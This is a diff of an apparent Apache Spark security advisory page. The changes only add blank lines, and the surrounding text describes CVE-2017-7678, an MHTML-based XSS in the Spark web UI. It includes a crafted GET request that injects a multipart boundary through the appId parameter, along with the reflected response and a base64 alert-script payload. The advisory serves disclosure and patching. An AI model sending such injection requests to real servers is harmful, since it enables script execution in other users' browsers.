@@ -42,6 +42,7 @@ Mitigation:
 Update to Apache Spark 2.1.2, 2.2.0 or later.
 
 Credit:
+
 - Aditya Sharad, Semmle
 
 <h3 id="CVE-2017-7678">CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability</h3>
@@ -63,6 +64,7 @@ Update to Apache Spark 2.1.2, 2.2.0 or later.
 
 Example:
 Request:
+
 ```
 GET /app/?appId=Content-Type:%20multipart/related;%20boundary=_AppScan%0d%0a--
 _AppScan%0d%0aContent-Location:foo%0d%0aContent-Transfer-
@@ -71,6 +73,7 @@ HTTP/1.1
 ```
 
 Excerpt from response:
+
 ```
 <div class="row-fluid">No running application with ID Content-Type: multipart/related;
 boundary=_AppScan
@@ -80,11 +83,14 @@ Content-Transfer-Encoding:base64
 PGh0bWw+PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw+
 </div>
 ```
+
 Result: In the above payload the BASE64 data decodes as:
+
 ```
 <html><script>alert("XSS")</script></html>
 ```
 
 Credit:
+
 - Mike Kasper, Nicholas Marion
 - IBM z Systems Center for Secure Engineering
